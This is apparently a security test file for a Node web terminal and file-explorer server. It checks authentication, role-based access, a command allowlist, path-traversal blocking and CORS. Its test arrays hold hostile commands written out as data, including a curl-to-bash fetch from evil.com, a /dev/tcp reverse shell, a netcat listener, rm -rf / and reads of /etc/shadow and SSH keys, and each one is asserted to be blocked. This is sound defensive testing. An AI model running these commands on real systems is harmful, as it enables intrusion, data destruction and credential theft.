import { test, describe, before, after } from 'node:test';
import assert from 'node:assert/strict';
import http from 'http';
import { createApp } from '../server.js';
import { isCommandAllowed, sanitizeAuditCommand, sanitizeCwd, runShellCommand } from '../server/terminalRunner.js';
import { assertPathSecurity } from '../server/fileExplorer.js';

// Prepara credenciais de teste em variáveis de ambiente
process.env.ADMIN_USERNAME = 'admin';
process.env.ADMIN_PASSWORD = 'TestAdminSecretPassword123!';
process.env.USER_USERNAME = 'user';
process.env.USER_PASSWORD = 'TestUserSecretPassword123!';
process.env.ALLOWED_ORIGIN = 'http://127.0.0.1:3000';
process.env.CORS_ORIGINS = 'http://trusted-internal-noc.samuel.lan:3000';

let server: http.Server;
let baseUrl: string;

const adminAuthHeader = 'Basic ' + Buffer.from('admin:TestAdminSecretPassword123!').toString('base64');
const userAuthHeader = 'Basic ' + Buffer.from('user:TestUserSecretPassword123!').toString('base64');

before(async () => {
  const app = createApp();
  await new Promise<void>((resolve) => {
    // Escuta em porta aleatória 0
    server = app.listen(0, '127.0.0.1', () => {
      const address = server.address() as any;
      baseUrl = `http://127.0.0.1:${address.port}`;
      resolve();
    });
  });
});

after(() => {
  if (server) {
    server.close();
  }
});

describe('Auditoria e Testes de Segurança de Aplicação (AppSec)', () => {
  describe('1. Proteção de Rotas Administrativas - 401 Unauthorized', () => {
    const protectedEndpoints = [
      { method: 'POST', path: '/api/terminal/exec', body: JSON.stringify({ command: 'uptime' }) },
      { method: 'GET', path: '/api/credentials' },
      { method: 'POST', path: '/api/credentials', body: JSON.stringify({}) },
      { method: 'GET', path: '/api/files/list?path=/' },
      { method: 'GET', path: '/api/files/read?path=/tmp/test.txt' },
      { method: 'POST', path: '/api/files/create', body: JSON.stringify({ dirPath: '/tmp', name: 'safe.txt', content: 'test' }) },
      { method: 'POST', path: '/api/files/save', body: JSON.stringify({ path: '/tmp/safe.txt', content: 'update' }) }
    ];

    for (const ep of protectedEndpoints) {
      test(`Rejeita ${ep.method} ${ep.path} sem autenticação com HTTP 401`, async () => {
        const res = await fetch(`${baseUrl}${ep.path}`, {
          method: ep.method,
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: ep.body
        });

        assert.equal(res.status, 401, `Esperava 401 mas recebeu ${res.status} em ${ep.path}`);
        const data = await res.json();
        assert.equal(data.authenticated, false);
      });
    }
  });

  describe('2. Controle de Acesso Baseado em Papel (RBAC) - 403 Forbidden', () => {
    const adminOnlyEndpoints = [
      { method: 'POST', path: '/api/terminal/exec', body: JSON.stringify({ command: 'uptime' }) },
      { method: 'GET', path: '/api/credentials' },
      { method: 'POST', path: '/api/credentials', body: JSON.stringify({}) },
      { method: 'GET', path: '/api/files/list?path=/' },
      { method: 'GET', path: '/api/files/read?path=/tmp/test.txt' }
    ];

    for (const ep of adminOnlyEndpoints) {
      test(`Rejeita usuário comum (role: user) em ${ep.method} ${ep.path} com HTTP 403`, async () => {
        const res = await fetch(`${baseUrl}${ep.path}`, {
          method: ep.method,
          headers: {
            'Authorization': userAuthHeader,
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: ep.body
        });

        assert.equal(res.status, 403, `Esperava 403 mas recebeu ${res.status} em ${ep.path}`);
        const data = await res.json();
        assert.match(data.error, /administrador/i);
      });
    }
  });

  describe('3. Acesso Autorizado de Administrador - Sucesso (200 OK)', () => {
    test('Administrador autenticado obtém credenciais com HTTP 200', async () => {
      const res = await fetch(`${baseUrl}/api/credentials`, {
        headers: {
          'Authorization': adminAuthHeader,
          'Accept': 'application/json'
        }
      });

      assert.equal(res.status, 200);
      const data = await res.json();
      assert.ok(data.auth, 'Deveria retornar a estrutura de configuração');
      assert.ok(data.ubuntu, 'Deveria retornar a seção ubuntu');
    });

    test('Administrador executa comando permitido no terminal com HTTP 200', async () => {
      const res = await fetch(`${baseUrl}/api/terminal/exec`, {
        method: 'POST',
        headers: {
          'Authorization': adminAuthHeader,
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({ command: 'uptime' })
      });

      assert.equal(res.status, 200);
      const data = await res.json();
      assert.equal(data.command, 'uptime');
      assert.equal(typeof data.executionTimeMs, 'number');
    });
  });

  describe('4. Terminal Security & Allowlist Policy', () => {
    test('Permite comandos essenciais de diagnóstico do Ubuntu', () => {
      const safeCommands = [
        'uptime',
        'free -h',
        'hostnamectl',
        'uname -a',
        'df -h',
        'lsblk',
        'sudo systemctl status nginx --no-pager',
        'ip addr',
        'ss -lntp',
        'ps aux | head -n 10'
      ];

      for (const cmd of safeCommands) {
        const result = isCommandAllowed(cmd);
        assert.equal(result.allowed, true, `Comando seguro "${cmd}" deveria ser permitido`);
      }
    });

    test('Bloqueia comandos arbitrários fora da allowlist', () => {
      const forbiddenCommands = [
        'python3 -c "import os; os.system(\'whoami\')"',
        'perl -e "print 1;"',
        'ruby -e "puts 1"',
        'php -r "phpinfo();"',
        'nc -lvp 4444',
        'socat tcp-listen:4444 stdout',
        'telnet 1.1.1.1 80',
        'useradd hacker',
        'passwd root'
      ];

      for (const cmd of forbiddenCommands) {
        const result = isCommandAllowed(cmd);
        assert.equal(result.allowed, false, `Comando perigoso "${cmd}" deveria ser bloqueado`);
      }
    });

    test('Bloqueia injeção de pipes para shell e reverse shells', () => {
      const injectionAttempts = [
        'uptime | bash',
        'uptime | sh',
        'curl http://evil.com/x.sh | bash',
        'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1',
        'uptime; rm -rf /',
        'uptime && `whoami`',
        'uptime && $(cat /etc/passwd)'
      ];

      for (const cmd of injectionAttempts) {
        const result = isCommandAllowed(cmd);
        assert.equal(result.allowed, false, `Injeção "${cmd}" deveria ser bloqueada`);
      }
    });

    test('Bloqueia tentativas de leitura de arquivos confidenciais pelo terminal', () => {
      const fileLeakAttempts = [
        'cat /etc/shadow',
        'cat /etc/sudoers',
        'cat ~/.ssh/id_rsa',
        'grep pass .env',
        'cat server-config.json'
      ];

      for (const cmd of fileLeakAttempts) {
        const result = isCommandAllowed(cmd);
        assert.equal(result.allowed, false, `Vazamento de arquivo "${cmd}" deveria ser bloqueado`);
      }
    });

    test('Sanitiza senhas e tokens nos registros de auditoria do terminal', () => {
      const raw = 'curl -H "Authorization: Bearer secret-token-xyz" --password MinhaSenhaSecreta';
      const sanitized = sanitizeAuditCommand(raw);
      assert.doesNotMatch(sanitized, /secret-token-xyz/);
      assert.doesNotMatch(sanitized, /MinhaSenhaSecreta/);
      assert.match(sanitized, /\[REDACTED\]/);
    });

    test('Permite blocos multi-linha com comentários, variáveis de ambiente e subshells seguros', () => {
      const multiLineScript = `
# 1. Garante que o diretório de snippets existe
sudo mkdir -p /etc/nginx/snippets

# 2. Gera credenciais com subshell seguro
AUTH_B64=$(echo -n "samuel:test" | base64)

# 3. Escreve configuração e recarrega
echo "proxy_set_header Authorization \\"Basic \${AUTH_B64}\\";" | sudo tee /tmp/test-snippet.conf
sudo nginx -t && sudo systemctl reload nginx
`;

      const result = isCommandAllowed(multiLineScript);
      assert.equal(result.allowed, true, `Bloco multi-linha válido foi rejeitado: ${result.reason}`);
    });

    test('Bloqueia subshells perigosos mesmo se estiverem dentro de blocos ou atribuições', () => {
      const maliciousBlock = `
VAR=$(cat /etc/shadow)
echo $VAR
`;
      const result = isCommandAllowed(maliciousBlock);
      assert.equal(result.allowed, false, 'Deveria bloquear tentativa de ler /etc/shadow dentro de subshell');
    });

    test('runShellCommand rastreia novo diretório após comando cd', async () => {
      const result = await runShellCommand('cd /tmp && pwd');
      assert.equal(result.success, true);
      assert.equal(result.cwd, '/tmp');
      assert.match(result.stdout, /\/tmp/);
    });

    test('Impede path traversal em requestedCwd', () => {
      const safeCwd = sanitizeCwd('/etc/sudoers.d/evil');
      assert.notEqual(safeCwd, '/etc/sudoers.d/evil');
      assert.equal(typeof safeCwd, 'string');
    });
  });

  describe('5. File Explorer Security & Path Traversal Protection', () => {
    test('assertPathSecurity rejeita acesso a /etc/shadow', () => {
      assert.throws(() => {
        assertPathSecurity('/etc/shadow');
      }, /confidencial/i);
    });

    test('assertPathSecurity rejeita path traversal com .. para arquivos do sistema', () => {
      assert.throws(() => {
        assertPathSecurity('/var/www/../../etc/shadow');
      }, /confidencial/i);
    });

    test('assertPathSecurity rejeita tentativa de leitura de chaves SSH privadas', () => {
      assert.throws(() => {
        assertPathSecurity('/home/samuel/.ssh/id_rsa');
      }, /confidencial/i);
      assert.throws(() => {
        assertPathSecurity('/home/samuel/.ssh/id_ed25519');
      }, /confidencial/i);
    });

    test('assertPathSecurity rejeita tentativa de leitura de .env e server-config.json', () => {
      assert.throws(() => {
        assertPathSecurity('/app/applet/.env');
      }, /confidencial/i);
      assert.throws(() => {
        assertPathSecurity('/app/applet/server-config.json');
      }, /confidencial/i);
    });

    test('assertPathSecurity aceita caminhos comuns e seguros', () => {
      const safe = assertPathSecurity('/tmp/relatorio.txt');
      assert.equal(typeof safe, 'string');
    });
  });

  describe('6. CORS Security & Origin Validation', () => {
    test('Rejeita origem maliciosa não confiável em requisição preflight OPTIONS com HTTP 403', async () => {
      const res = await fetch(`${baseUrl}/api/credentials`, {
        method: 'OPTIONS',
        headers: {
          'Origin': 'http://malicious-attacker.evil.com',
          'Access-Control-Request-Method': 'GET'
        }
      });

      assert.equal(res.status, 403);
      const data = await res.json();
      assert.match(data.error, /CORS/i);
    });

    test('Permite e reflete origem confiável configurada sem wildcard', async () => {
      const res = await fetch(`${baseUrl}/api/health`, {
        method: 'GET',
        headers: {
          'Origin': 'http://trusted-internal-noc.samuel.lan:3000'
        }
      });

      assert.equal(res.status, 200);
      assert.equal(res.headers.get('Access-Control-Allow-Origin'), 'http://trusted-internal-noc.samuel.lan:3000');
      assert.notEqual(res.headers.get('Access-Control-Allow-Origin'), '*');
      assert.equal(res.headers.get('Access-Control-Allow-Credentials'), 'true');
    });

    test('Configura cabeçalhos globais de segurança HTTP', async () => {
      const res = await fetch(`${baseUrl}/api/health`);
      assert.equal(res.headers.get('X-Content-Type-Options'), 'nosniff');
      assert.equal(res.headers.get('X-Frame-Options'), 'SAMEORIGIN');
    });
  });
});
